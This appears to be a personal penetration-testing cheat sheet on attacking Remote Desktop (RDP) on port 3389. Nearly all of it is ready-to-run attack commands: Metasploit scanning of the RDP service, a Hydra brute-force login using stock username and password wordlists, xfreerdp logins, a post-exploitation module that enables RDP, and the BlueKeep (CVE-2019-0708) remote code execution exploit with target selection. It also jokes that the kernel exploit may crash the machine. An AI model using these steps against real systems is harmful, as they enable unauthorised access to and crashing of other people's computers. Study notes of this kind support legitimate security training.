port 3389
![](</Images/Pasted image 20231203135716.png>)

to verify a port is actually RDP. two methods
#msfconsole serach rdp_scanner
```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS $IP
set RPORT 3333
run
```


brute force login using Hydra
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -s $PORT $IP rdp
```

xfreerdp to login
```bash
xfreerdp /u:<username> /p:<password>/v:<ip address>:<port>
```

## Enable RDP post explotation
`search enable_rdp`

That enables rdp along with port. Once done use #xfreerdp to connect. Requires credentials. 
```
xfrerdp /u:<user> /p:<pass> /v:<ip>
```


## BlueKeep Exploit

To check if vulnerable
```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS $IP
exploit
```

If vulnerable use:
```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS $IP
show targets #check target options
set target 5
exploit
```

> **NOTE** kernel exploits can crash machine. If this crashes machine, RIP. Use google to resolve. :)